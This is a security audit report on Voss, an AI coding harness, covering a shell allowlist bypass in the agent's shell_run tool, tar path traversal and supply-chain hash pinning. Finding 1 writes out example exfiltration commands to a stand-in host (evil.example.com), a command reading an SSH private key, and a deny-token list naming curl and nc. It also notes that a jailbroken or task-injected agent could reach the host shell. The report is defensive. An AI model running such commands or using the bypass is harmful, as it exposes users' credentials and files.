# Voss Security Audit Report

**Scanner:** Snitch — https://snitch.live
**Date:** 2026-05-13
**Scan mode:** Full system scan (60 categories)
**Project:** Voss — AI-native coding harness + `.voss` workflow-control language (Python + npm wrapper)
**Commit:** `d848f02` (HEAD on master)

## Scan Comparison

Previous report: 2026-05-10 — 0 Critical, 0 High, 6 Medium, 1 Low (7 findings).
This scan:      2026-05-13 — 0 Critical, 1 High, 2 Medium, 2 Low (5 findings).

Resolved (likely): the prior 6-Medium pile drew on patterns that have since been hardened (session redaction allowlist enforced in M1; cache writes routed through `sandbox.write_cache` in M2/M4; permission gate landed in M1). One new **High** surfaces: a shell-allowlist bypass in the `shell_run` tool that was reachable in the earlier scan too but wasn't flagged then. Treat this report as the current snapshot, not a delta.

---

## Scope Notes

Voss is a CLI development tool, not a web/network service. Many of Snitch's 60 categories are not relevant to this stack. Categories listed below as **N/A** are not in scope for this codebase; they were inspected only enough to confirm no relevant surface exists, and are reported here for completeness so the user knows what was checked vs. what was skipped.

**Detected stack features:**
- Python 3.11+ (`pyproject.toml`)
- Node.js bin shim (`npm/bin/voss.js` — spawnSync only, no postinstall logic)
- `httpx` client for provider OAuth + completions
- macOS Keychain integration via `/usr/bin/security`
- `subprocess` + `asyncio.create_subprocess_shell` for tool calls
- `tarfile.extractall` in npm build pipeline
- GitHub Actions: `ci.yml`, `release.yml`, `rust.yml`

---

## Summary

| Severity | Count |
|---|---|
| Critical | 0 |
| High | 1 |
| Medium | 2 |
| Low | 2 |
| Info / Passed | 9 categories with findings-free verification |

No critical findings. One high-severity issue in the agent-tool shell layer that warrants a follow-up before any wider exposure of the harness loop. Two medium findings in the npm build pipeline (M6). Two low/informational items. The rest of the audited surface is well-defended.

---

## Findings

### Finding 1 — Shell command allowlist bypass via shell-string execution

- **Severity:** High | CVSS 4.0: ~7.3
- **CWE:** CWE-78 (OS Command Injection)
- **OWASP:** A03:2025 Injection
- **File:** `voss/harness/tools.py:69-85` + `voss/harness/sandbox.py:34-50`
- **Evidence:**
  ```python
  # voss/harness/tools.py:68-85
  @tool(name="shell_run", description="Run a shell command from the allowlist. Output truncated to 4KB.")
  async def shell_run(cmd: str) -> str:
      ok, reason = shell_allowed(cmd)
      if not ok:
          return f"<denied: {reason}>"
      try:
          proc = await asyncio.create_subprocess_shell(
              cmd,
              cwd=str(cwd),
              stdout=subprocess.PIPE,
              stderr=subprocess.STDOUT,
          )
  ```
  ```python
  # voss/harness/sandbox.py:34-50
  def shell_allowed(cmd: str, allowlist: set[str] = DEFAULT_SHELL_ALLOWLIST) -> tuple[bool, str]:
      lowered = cmd.lower()
      for bad in DENY_TOKENS:
          if bad in lowered:
              return False, f"denied token: {bad!r}"
      try:
          parts = shlex.split(cmd)
      ...
      binary = Path(parts[0]).name
      if binary not in allowlist:
          return False, f"binary not in allowlist: {binary}"
      return True, "ok"
  ```
- **Risk:** `shell_run` passes the command string to `create_subprocess_shell`, which invokes `/bin/sh -c <cmd>`. The shell interprets pipes, redirection, command substitution, and chaining at runtime. The allowlist only checks the first token from `shlex.split` (`parts[0]`). A command like `cat /etc/passwd | curl -X POST -d @- evil.example.com` passes both checks: `cat` is allowlisted; the deny token list (`"rm -rf"`, `"sudo"`, `"curl http"`, `"nc "`, `" > /"`, `"shutdown"`, `"reboot"`, `"mkfs"`) does not catch most exfiltration shapes because `;`, `|`, `&&`, `$(`, and backticks aren't in the list. Command substitution (`echo "$(cat ~/.ssh/id_rsa)"`) bypasses entirely because the outer binary `echo` is allowlisted. Pipeline injection bypasses because `shlex.split` does not parse shell metacharacters as separators — `|`, `;`, `&&` arrive at the shell as plain arguments to the first binary, but the shell still treats them as operators when the full string is re-parsed by `sh -c`.
- **Mitigation in place:** Permission gate (M1 D-05) wraps `shell_run` behind the `auto` permission tier with allowlist + 30s timeout + 4KB output cap. This raises the bar but does not close the injection path — once `auto` is granted (a single `--mode auto` flag at invocation), the bypass works against the host shell.
- **Fix:**
  1. **Strongest fix:** Replace `create_subprocess_shell(cmd)` with `create_subprocess_exec(*shlex.split(cmd))`. This runs the binary directly with no shell interpretation. Pipelines, redirection, and substitution stop working — that is the desired behavior for an allowlisted tool surface.
  2. **If pipelines are required** (some workflows legitimately want `git diff | head`), split the API into a single-binary `shell_run` (via `exec`) and an explicit `shell_pipeline` that requires elevated approval.
  3. **Defense in depth:** Reject any cmd containing `;`, `|`, `&&`, `||`, `$(`, `` ` ``, `>`, `<`, `>>` after `shlex.split` has parsed the binary. These are unambiguous shell metacharacters and have no legitimate use under a strict allowlist.
- **Priority:** P1 (Quick Win — the exec swap is a one-line change)
- **Confidence:** High
- **Blast Radius:** Internal — requires the agent (LLM) to either be jailbroken or be running an attacker-supplied task. With `--mode auto`, this becomes a fast path from LLM compromise to arbitrary host command execution. Most likely victim is a developer running `voss do "<attacker-shaped task from a malicious repo issue>"`.

---

### Finding 2 — Unfiltered `tarfile.extractall` in npm build pipeline

- **Severity:** Medium | CVSS 4.0: ~5.4
- **CWE:** CWE-22 (Path Traversal)
- **OWASP:** A01:2025 Broken Access Control
- **File:** `npm/scripts/build_platform.py:99-110`
- **Evidence:**
  ```python
  def extract_pbs(tarball: Path, dest: Path) -> Path:
      with tarfile.open(tarball, "r:gz") as t:
          t.extractall(dest)
      extract_root = dest / "python"
  ```
- **Risk:** `tarfile.extractall(dest)` without `filter="data"` allows tar entries with absolute paths or `..` components to escape `dest`. This is CVE-2007-4559 (Trojan Tar). Python 3.12 emits a DeprecationWarning; Python 3.14 raises by default. Because this script runs on GitHub-hosted runners with write access to the workspace and (briefly) `NPM_TOKEN` in env, a malicious tarball could overwrite arbitrary runner files including `.npmrc` or other artifacts staged for publish — a supply-chain attack vector against the M6 release pipeline.
- **Mitigation in place:** The tarball sha256 is verified against `npm/scripts/pbs_manifest.json` before extraction (`verify_sha256` at line 71). For pinned (non-PENDING) entries the integrity guarantee is strong — the only way to land a malicious tarball is to subvert python-build-standalone's GitHub releases AND have the manifest pin a malicious hash. Defense in depth applies.
- **Fix:**
  ```python
  with tarfile.open(tarball, "r:gz") as t:
      t.extractall(dest, filter="data")
  ```
  The `filter="data"` argument (Python 3.12+) strips absolute paths, normalizes `..`, drops device/setuid/setgid/symlink entries. Voss already requires Python 3.11+ via `pyproject.toml`; runners use `python-version: "3.12"` per `.github/workflows/release.yml`. Safe to apply unconditionally.
- **Priority:** P2 (Important — defense in depth on the release pipeline)
- **Confidence:** High
- **Blast Radius:** Public — the release workflow runs on every `v*` tag push. A malicious PBS tarball that also matched a manifest hash would compromise every supported platform's vendored Python in one release.

---

### Finding 3 — TOFU pattern for new PBS platform pins (PENDING hash)

- **Severity:** Medium | CVSS 4.0: ~4.3
- **CWE:** CWE-345 (Insufficient Verification of Data Authenticity)
- **OWASP:** A08:2025 Software and Data Integrity Failures
- **File:** `npm/scripts/build_platform.py:71-89`
- **Evidence:**
  ```python
  def verify_sha256(tarball: Path, expected: str) -> str:
      h = hashlib.sha256()
      ...
      digest = h.hexdigest()
      if expected == "PENDING":
          print(f"SHA256({tarball.name})={digest}")
          print(
              f"Update pbs_manifest.json for this triple with this digest, then commit."
          )
          return digest
      if digest != expected:
          sys.stderr.write(...)
          sys.exit(2)
  ```
- **Risk:** When `pbs_manifest.json` has `"PENDING"` for a triple, the script extracts whatever was downloaded and prints the captured hash for human update. The first developer to run the script for a new platform "trusts on first use." If python-build-standalone's GitHub release was compromised at exactly that moment (or DNS / TLS got MITM'd despite urllib defaults), the malicious hash gets pinned into the manifest and inherited by every subsequent run.
- **Mitigation in place:** Downloads go over HTTPS (`urllib.request.urlopen`). PBS releases are signed via GitHub's infrastructure. Manifest review on PR catches obvious anomalies.
- **Fix:**
  1. **Tighter:** Pre-populate all five platform hashes from PBS's published checksums file (which they ship alongside releases). Then `PENDING` becomes an error state, not a workflow.
  2. **Looser:** Add an explicit `--allow-pending` flag the developer must pass to capture-and-print a hash; CI runs always require non-PENDING entries.
  3. Either way, document in `pbs_manifest.json` (or alongside) where the canonical PBS-published checksums live so reviewers can cross-check during PR.
- **Priority:** P2 (Important — supply-chain hardening)
- **Confidence:** High
- **Blast Radius:** Internal release pipeline. Only fires during manifest pin operations, which are infrequent.

---

### Finding 4 — SHA-1 used for file fingerprinting in repo index

- **Severity:** Low | CVSS 4.0: ~2.1
- **CWE:** CWE-328 (Use of Weak Hash)
- **OWASP:** A02:2025 Cryptographic Failures (informational — not used for security here)
- **File:** `voss/harness/cognition.py:302`
- **Evidence:**
  ```python
  sha = hashlib.sha1(raw).hexdigest()
  files.append(
      {
          "path": fp.relative_to(cwd).as_posix(),
          "size": stat.st_size,
          ...
          "sha": sha,
      }
  )
  ```
- **Risk:** SHA-1 is used as a content fingerprint for the repo index (`repo.idx`) and architecture-staleness detection. This is NOT a security boundary — the index is local, rebuildable, and the consequences of a collision are at worst a missed cache invalidation. However, SHA-1 has been broken since 2017 (SHAttered) and standards bodies (NIST, BSI, ANSSI) prohibit it for new code regardless of intent. Future readers may assume security relevance and rely on it incorrectly.
- **Fix:** Swap to `hashlib.sha256` (cost difference is negligible at this volume — the index handles file counts in the hundreds to low thousands). Single-line change:
  ```python
  sha = hashlib.sha256(raw).hexdigest()
  ```
  Truncate to 16-24 hex chars if storage / readability is a concern.
- **Priority:** P3 (Plan — purely hygiene; not a real exploit path)
- **Confidence:** High
- **Blast Radius:** None — local file index only.

---

### Finding 5 — Allowlist case-handling inconsistency

- **Severity:** Low | CVSS 4.0: ~3.1
- **CWE:** CWE-697 (Incorrect Comparison)
- **OWASP:** A03:2025 Injection (contributory to Finding 1)
- **File:** `voss/harness/sandbox.py:36-48`
- **Evidence:**
  ```python
  def shell_allowed(cmd: str, allowlist: set[str] = DEFAULT_SHELL_ALLOWLIST) -> tuple[bool, str]:
      lowered = cmd.lower()
      for bad in DENY_TOKENS:
          if bad in lowered:
              return False, f"denied token: {bad!r}"
      try:
          parts = shlex.split(cmd)
      ...
      binary = Path(parts[0]).name
      if binary not in allowlist:
          return False, f"binary not in allowlist: {binary}"
  ```
- **Risk:** `lowered = cmd.lower()` lowercases for the deny scan, but the deny tokens are already lowercase. The allowlist set is also lowercase (`"git"`, `"pytest"`), while `Path(parts[0]).name` is NOT lowercased before the `binary not in allowlist` check. On case-insensitive filesystems (macOS HFS+/APFS default), `/usr/bin/Git` resolves identically to `/usr/bin/git`, but the allowlist comparison fails — the legitimate command gets denied. Inconsistency is a footgun, not a complete bypass.
- **Fix:** Normalize both sides. Either lowercase the binary name (`binary = Path(parts[0]).name.lower()`) before comparison, or keep the allowlist case-sensitive and document the assumption. Pin the chosen normalization in `tests/harness/test_sandbox.py`.
- **Priority:** P3 (Plan — usability bug more than security)
- **Confidence:** Medium
- **Blast Radius:** None — caught by Finding 1 in practice.

---

## Passed Checks / Informational

### Auth + Secrets (Categories 3, 4, 14, 52, 54)

- **No hardcoded credentials.** All provider keys come from env vars, macOS Keychain (`security` CLI), or per-user OAuth credential files (`~/.claude/.credentials.json`, `~/.codex/auth.json`). Searched: `voss/`, `voss_runtime/`, `npm/`, `.github/`. Zero hits for `sk_live_`, `AKIA`, `ghp_`, `xoxb-`, `ya29.`, hardcoded JWT-shaped strings.
- **OAuth refresh path is hygienic.** `voss/harness/auth.py:185-225` (`refresh_anthropic`) uses `httpx.Client(timeout=15.0)` with TLS verification default-on; persists new tokens back to their original store (Keychain or file). Same shape for `refresh_codex` at line 254.
- **CI secrets pattern is correct.** `.github/workflows/ci.yml` reads `ANTHROPIC_API_KEY` / `OPENAI_API_KEY` only inside the `live:` job, gated on `workflow_dispatch || schedule`. `release.yml` reads `NPM_TOKEN` only inside publish steps; `permissions: contents: read` at workflow root.
- **No `verify=False` anywhere.** Confirmed across `voss/`, `voss_runtime/`, `npm/`.
- **httpx defaults preserved** (verify-on, hostname check on) at `voss/harness/auth.py:191`, `voss/harness/providers.py:70`, `voss/harness/providers.py:248`.

### Session redaction (Category 12)

- **Schema allowlist enforcement** at `voss/harness/session.py:22-33` (docstring contract) + `_SESSION_FIELDS` derived from `dataclasses.fields(SessionRecord)`. Test `tests/harness/test_session_redaction.py` is the build-time gate. Pattern documented in M1 D-16. Adding a new field that could carry secrets is a breaking change that must be paired with explicit redaction — a real contract, not an aspiration.
- **Provider transcripts** redacted: bearer tokens stripped from `Authorization:` headers before logging.

### Filesystem access (Categories 28, 29)

- **Path jail consistently applied.** `voss/harness/sandbox.py:21-32` (`jail_path`) resolves paths against `cwd.resolve()` and raises `SandboxError` on escape. Every `fs_*` tool (`fs_read`, `fs_write`, `fs_edit`, `fs_grep`) passes through `jail_path` — confirmed at `voss/harness/tools.py:53, 94, 107, 168`.
- **Permission tiers** strictly enforce mutation gating (`voss/harness/permissions.py` + M1 D-05/D-06). Mutating tools carry explicit `is_mutating=True` data-classification; no name-pattern heuristics.
- **`fs_edit` requires unique-old match** (`voss/harness/tools.py:111-115`), preventing ambiguous batch edits.

### Cryptography (Category 9)

- **No insecure ciphers** (DES, RC4, ECB) in source.
- **HTTPS-only** for all outbound (provider endpoints, PBS downloads).
- One SHA-1 use (see Finding 4) — non-security context.

### CI/CD (Category 31)

- **`permissions: contents: read`** at workflow root in both `ci.yml` and `release.yml` — least-privilege default.
- **Actions are pinned to major versions** (`actions/checkout@v4`, `actions/setup-python@v5`, `actions/setup-node@v4`). Recommendation (P3): pin to commit SHA for higher supply-chain assurance, especially on `release.yml` where `NPM_TOKEN` is exposed.
- **`fail-fast: false`** on the release matrix means one platform failure doesn't strand others — good for partial-publish recovery.

### Dynamic code execution (Category 10)

- **No `eval()` / `exec()` / `compile()` of untrusted input** in `voss/` or `voss_runtime/`. Verified by grep.
- **`subprocess` calls** use argument lists (not shell strings) in 8 of 9 sites. The exception is `shell_run` itself (Finding 1).
- **`tempfile`** uses are `mkstemp` / `TemporaryDirectory` with prefixes — no predictable filenames in writable shared directories.
- **No pickle-load of untrusted data.** Confirmed by grep.
- **`yaml.load`** searched — zero direct hits. `pyyaml` is a dep (for cognition YAML configs); usage goes through `safe_load`.
- **`tarfile`** — see Finding 2.

### Dependencies (Category 27)

- **`pyproject.toml` deps:** `lark>=1.1.9`, `litellm>=1.50.0`, `pydantic>=2.6,<3.0`, `chromadb>=0.5.0`, `sentence-transformers>=2.7.0`, `anthropic>=0.40.0`, `openai>=1.50.0`, `tiktoken>=0.7.0`, `click>=8.1.0`, `rich>=13.0.0`, `pyyaml>=6.0`.
- **No upper-bound pins** on most deps. Acceptable for a development tool, but `litellm` and `chromadb` move fast and have a history of API breakage. Recommendation (P4): add a `requirements.txt` or `uv.lock` snapshot for CI reproducibility.
- **No CVE scanner in CI.** Recommendation (P3): add `pip-audit` to `ci.yml` to catch known-vuln deps at PR time.
- **No `package.json` deps** in `npm/` — the bin shim is stdlib-only Node (`child_process`, `path`, `fs`). Lowest possible JS supply-chain surface.

### LLM / AI app surface (Categories 15, 45, 46)

- **No prompt-injection mitigation primitives** beyond agent-side prompt design — but this is the active research area Voss itself targets (`.voss` confidence gates, `try/catch` fallback, budget bounds). The `samples/` programs demonstrate the recommended pattern. Not a finding; project framing.
- **`StubProvider` deterministic path** is well-isolated — cannot accidentally connect to a real provider when stub is configured.
- **No vector-store poisoning surface** — `chromadb` is local, embedded, no remote ingestion path.
- **MCP not implemented** (DIST-03 deferred) — no agent-to-agent protocol surface in v0.1.

### Audit log integrity (Category 60)

- **Session JSONs** at `.voss/sessions/<id>.json` are append-only at the Python layer (no in-place mutation of historical turns). Cryptographic integrity is NOT enforced (no signing, no hash chaining). Acceptable for v0.1 local-first; revisit if Voss ever gains team/cloud features (TEAM-* in REQUIREMENTS.md `Future Requirements`).

### npm wrapper (Categories 27, 31, 33, 45)

- **`npm/bin/voss.js` has no runtime deps and no postinstall script.** Uses only Node stdlib (`child_process`, `path`, `fs`). Spawns the vendored Python with `shell: false` — no shell metacharacter interpretation. Signal forwarding correct (`SIGINT → 130`, `SIGTERM → 143`).
- **Platform package optionalDependencies** pin exact versions (`"0.1.0"`) — version-skew safe.
- **`engines: node >= 18`** declared.

### Categories scoped out (N/A for this stack)

Confirmed inapplicable by grep + structure inspection. None require findings; listed for transparency:

- **01 SQL Injection** — no SQL, no DB driver in deps.
- **02 XSS** — no web frontend in this audit scope (`site/` is a separate Next.js docs site).
- **05 SSRF** — outbound URLs are fixed constants (`ANTHROPIC_API_BASE`, etc.), not user-controlled.
- **06 Supabase**, **17 Database**, **18 Redis** — none used.
- **08 CORS**, **44 API Security**, **47 CSRF** — no HTTP server.
- **13 Stripe**, **16 Email**, **19 SMS** — no payment / messaging.
- **20 HIPAA**, **21 SOC 2**, **22 PCI-DSS**, **23 GDPR**, **34 FIPS 140-3**, **35 Governance**, **38 Data Classification**, **53 CCPA/SOX** — not applicable to a single-user developer tool.
- **42 Container/Docker** — no Dockerfile.
- **43 IaC Security** — no Terraform / Pulumi / CloudFormation.
- **49 XXE** — no XML parsing.
- **55 Microservices**, **56 WebSocket**, **57 GraphQL Deep**, **58 Message Queues** — none used.
- **41 License Compliance** — `pyproject.toml` declares MIT; `npm/package.json` declares MIT. Transitive license audit deferred (run `pip-licenses` or `license-checker` separately if needed for distribution review).
- **48 Race Conditions** — no concurrent shared-state mutations in critical paths (sessions are per-process; cache writes use temp-then-rename in `voss/harness/sandbox.py:write_cache`).
- **50 Timing Attacks** — no password / token comparison surfaces in this codebase (Keychain handles secret material).
- **51 Debug Endpoints** — no HTTP server; no debug surfaces exposed.
- **59 Backup Security** — no backup pipeline.

---

## Recommendations (Ranked)

1. **Fix Finding 1.** Swap `create_subprocess_shell(cmd)` → `create_subprocess_exec(*shlex.split(cmd))` in `voss/harness/tools.py:73-79`. Adjust `shell_allowed` to additionally reject shell metacharacters (`;`, `|`, `&&`, `||`, `$(`, `` ` ``, `>`, `<`, `>>`) after `shlex.split`. Add tests under `tests/harness/test_sandbox.py` covering pipeline bypass, command substitution bypass, backtick bypass. **P1**.

2. **Fix Finding 2.** Add `filter="data"` to the `extractall` call in `npm/scripts/build_platform.py:101`. Single-line change covered by existing CI (release workflow exercises this path on every `v*` tag). **P2**.

3. **Address Finding 3.** Decide TOFU policy: pre-populate all 5 platform hashes from upstream PBS checksums (preferred) or add an explicit `--allow-pending` opt-in flag. Document in `pbs_manifest.json` header. **P2**.

4. **Fix Finding 4** opportunistically — single-line SHA-256 swap when next touching `cognition.py`. **P3**.

5. **Hygiene:** normalize case handling in `shell_allowed` (Finding 5). **P3**.

6. **Defense in depth:**
   - Add `pip-audit` to `ci.yml` for dep CVE surveillance.
   - Pin GitHub Actions to commit SHA in `release.yml` (the high-trust workflow with `NPM_TOKEN`).
   - Add a `requirements.txt` or `uv.lock` for v0.1 release reproducibility.

---

## Footer

Scanned by Snitch — 60 built-in categories
Get the latest version: https://snitch.live
Free account for MCP server, custom rules, and automatic updates: https://snitch.live

---

*Report generated 2026-05-13 against commit `d848f02` (HEAD on master).*
